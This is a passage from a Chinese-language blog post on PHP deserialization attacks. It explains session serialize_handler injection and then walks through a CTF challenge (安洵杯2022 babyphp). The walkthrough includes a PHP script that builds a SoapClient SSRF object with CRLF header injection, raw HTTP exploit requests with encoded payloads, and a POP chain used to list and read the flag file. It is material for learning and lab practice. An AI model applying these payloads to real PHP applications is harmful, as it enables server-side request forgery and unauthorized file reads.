+<p> 在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。  </p>
+<p>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。</p>
+<p>例如传入</p>
+<pre><code class="php">$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#39;;
+</code></pre>
+<p>序列化引擎使用的是php_serialize，那么储存的session文件为</p>
+<pre><code class="php">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;
+</code></pre>
+<p>而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把a:1:{s:4:“name”;s:5:”当作键名，而把O:5:“Smi1e”:1:{s:4:“test”;s:3:“AAA”;}当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。</p>
+<p>所以我们就可以利用这点来构造session序列化,</p>
+<pre><code class="php">POST /?d0g3=php_serialize&amp;baby=session.serialize_handler
+
+sess=|xxx
+</code></pre>
+<p>而在flag.php中有</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669572974964-ddcf9fb4-9d32-4e4e-9206-4bdb6d083974.png" alt="img"></p>
+<p>我们显而易见是要构造soapclient类去SSRF,然后利用flag中的函数构造原生类去读取文件</p>
+<p>脚本如下:</p>
+<pre><code class="php">&lt;?php
+$target = &#39;http://127.0.0.1:80/flag.php?a=DirectoryIterator&amp;b=glob:///*f*&#39;;
+$post_string = &#39;HY=666&#39;;
+$headers = array(
+    &#39;X-Forwarded-For: 127.0.0.1&#39;,
+    &#39;Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl&#39;
+);
+$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));
+$aaa = serialize($b);
+$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);
+$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);
+echo urlencode($aaa);
+
+?&gt;
+</code></pre>
+<p>注意在本题中由于涉及倒session问题，PHPSESSID一定要一致</p>
+<p>最终可得到payload:</p>
+<pre><code class="php">POST /?d0g3=php_serialize&amp;baby=session.serialize_handler HTTP/1.1
+Host: 47.108.29.107:10354
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 502
+Origin: http://47.108.29.107:10354
+Connection: close
+Referer: http://47.108.29.107:10354/
+Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl
+Upgrade-Insecure-Requests: 1
+
+sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A62%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2F%2Af%2A%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A157%3A%22wupco%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+6%0D%0A%0D%0AHY%3D666%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+</code></pre>
+<p>我们可以通过这种办法把session写进去</p>
+<h3 id="使用pop链触发ssrf"><a href="#使用pop链触发ssrf" class="headerlink" title="使用pop链触发ssrf"></a>使用pop链触发ssrf</h3><p>可以在类中看到调用</p>
+<pre><code class="php">call_user_func(array(reset($_SESSION), $this-&gt;a))
+</code></pre>
+<p>这里call_user_func的用法，就是执行类中的静态函数或者一个对象的方法</p>
+<p>如果我们要ssrf访问flag.php,我们就使用原生类SoapClient该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
+<p>同时__call的触发方法就是在调用这个对象不存在的一个方法时触发，刚好符合我们的需求</p>
+<p>所以我们稍微修改下pop链条就可以触发ssrf</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574331967-d04a8061-386d-4121-852e-17431ba2c643.png" alt="img"></p>
+<pre><code class="php">O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:6:&quot;sakura&quot;;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;r:2;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;
+</code></pre>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>1.先利用session反序列化传入session的值</p>
+<pre><code class="php">POST /?d0g3=php_serialize&amp;baby=session.serialize_handler HTTP/1.1
+Host: 47.108.29.107:10354
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 502
+Origin: http://47.108.29.107:10354
+Connection: close
+Referer: http://47.108.29.107:10354/
+Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl
+Upgrade-Insecure-Requests: 1
+
+sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A62%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2F%2Af%2A%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A157%3A%22wupco%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+6%0D%0A%0D%0AHY%3D666%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574440522-428f74a1-d1f1-4232-beb7-51070680d9f1.png" alt="img"></p>
+<p>2.调用pop链进行SSRF</p>
+<pre><code class="php">POST / HTTP/1.1
+Host: 47.108.29.107:10354
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 279
+Origin: http://47.108.29.107:10354
+Connection: close
+Referer: http://47.108.29.107:10354/
+Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl
+Upgrade-Insecure-Requests: 1
+
+pop=O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22C%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22phpinf%22%3Bs%3A1%3A%22c%22%3BO%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A11%3A%220e215962017%22%3Bs%3A1%3A%22b%22%3Br%3A2%3B%7D%7Ds%3A1%3A%22b%22%3BN%3Bs%3A1%3A%22k%22%3BN%3B
+</code></pre>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574489346-916347ef-296e-406f-9900-d79d5a42f78d.png" alt="img"></p>
+<p>我们成功找到了根目录下flag文件的名称,接下来同理，构造原生类读取文件即可</p>
+<p>1.session反序列化</p>
+<pre><code class="php">POST /?d0g3=php_serialize&amp;baby=session.serialize_handler HTTP/1.1
+Host: 47.108.29.107:10354
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 493
+Origin: http://47.108.29.107:10354
+Connection: close
+Referer: http://47.108.29.107:10354/
+Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl
+Upgrade-Insecure-Requests: 1
+
+sess=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A63%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DSplFileObject%26b%3D%2Ff1111llllllaagg%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A157%3A%22wupco%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+6%0D%0A%0D%0AHY%3D666%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+</code></pre>
+<p>2.触发读flag文件(这里用的SplFileObject原生类)</p>
+<p>这里的数据包和上面一样，不过这题反序列化的时候要等挺长时间的</p>
+<p>3.访问主页面，记得不要再传参了，session会被覆盖</p>
+<p><img src="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/1669574785928-ec75acf4-bc07-40e5-b354-204c3470effd.png" alt="img"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoqiyue/p/10951836.html">https://www.cnblogs.com/xiaoqiyue/p/10951836.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39616995/article/details/118546436">https://blog.csdn.net/weixin_39616995/article/details/118546436</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/webu/archive/2013/01/28/2879383.html">https://www.cnblogs.com/webu/archive/2013/01/28/2879383.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/12/08/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/">https://sakurahack-y.github.io/2022/12/08/php反序列化总结/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">常用魔术方法总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F"><span class="toc-number">3.</span> <span class="toc-text">魔术方法的执行顺序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">对象注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%87%E9%92%88%E5%BC%95%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">指针引用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%83%A8%E5%88%86%E6%AD%A3%E5%88%99"><span class="toc-number">6.</span> <span class="toc-text">绕过部分正则</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fast-destruct-%E7%BB%95%E8%BF%87-wakeup"><span class="toc-number">7.</span> <span class="toc-text">fast destruct(绕过__wakeup)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php7-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E7%B1%BB%E5%B1%9E%E6%80%A7%E4%B8%8D%E6%95%8F%E6%84%9F"><span class="toc-number">8.</span> <span class="toc-text">php7.1+反序列化对类属性不敏感</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-number">9.</span> <span class="toc-text">16进制绕过字符的过滤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">10.</span> <span class="toc-text">PHP反序列化字符逃逸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">11.</span> <span class="toc-text">phar反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">12.</span> <span class="toc-text">php session反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8E%9F%E7%94%9F%E7%B1%BBSoapClient%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">13.</span> <span class="toc-text">PHP原生类SoapClient反序列化利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF2022-babyphp"><span class="toc-number">14.</span> <span class="toc-text">安洵杯2022  babyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%8E%B7%E5%8F%96phpinfo-%E6%9E%84%E9%80%A0pop%E9%93%BE%E6%9D%A1"><span class="toc-number">14.0.1.</span> <span class="toc-text">尝试获取phpinfo,构造pop链条</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1"><span class="toc-number">14.0.2.</span> <span class="toc-text">php session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8pop%E9%93%BE%E8%A7%A6%E5%8F%91ssrf"><span class="toc-number">14.0.3.</span> <span class="toc-text">使用pop链触发ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">14.0.4.</span> <span class="toc-text">利用过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">15.</span> <span class="toc-text">参考链接</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/">详解php://fliter &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
